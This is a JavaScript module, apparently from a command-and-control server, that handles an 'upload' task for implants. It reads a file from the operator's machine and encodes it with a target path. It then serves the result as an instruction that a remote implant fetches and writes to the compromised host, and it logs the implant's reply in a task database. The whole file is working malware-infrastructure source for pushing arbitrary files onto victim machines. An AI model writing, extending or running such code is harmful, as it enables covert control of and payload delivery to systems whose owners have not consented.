// Upload Task Handler
// Sends: task_id:base64("UPLOAD:<remote_path>:<base64(file_data)>")
// Implant writes file_data to remote_path and responds with a status string.
import fs from 'fs'
export class TaskHandler {
  constructor(task) {
    this.task = task
  }
  getTask = async function (req, res) {
    let params = JSON.parse(this.task.parameters)
    let local_path  = params.local_path
    let remote_path = params.remote_path

    let file_data
    try {
      file_data = fs.readFileSync(local_path)
    } catch (e) {
      res.code(500).type('text/plain').send(`C2 error: could not read ${local_path}: ${e.message}`)
      return
    }

    let payload = `UPLOAD:${Buffer.from(remote_path).toString('base64')}:${file_data.toString('base64')}`
    let instruction = `${this.task.id}:${Buffer.from(payload).toString('base64')}`
    let display = `Upload: ${local_path} → ${remote_path}`
    db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
      .run({ task_id: this.task.id, display: display })
    this.task.display = display
    res.send(instruction)
  }
  taskIO = async function (req, res) {
    this.task.output = Buffer.from(req.body, 'base64').toString('utf8')
    this.task.completed_at = Date.now()
    db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
      .run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
    res.type('text/plain').send('success')
    io('task_complete', this.task)
    delete active_implant_handlers[this.task.id]
  }
}
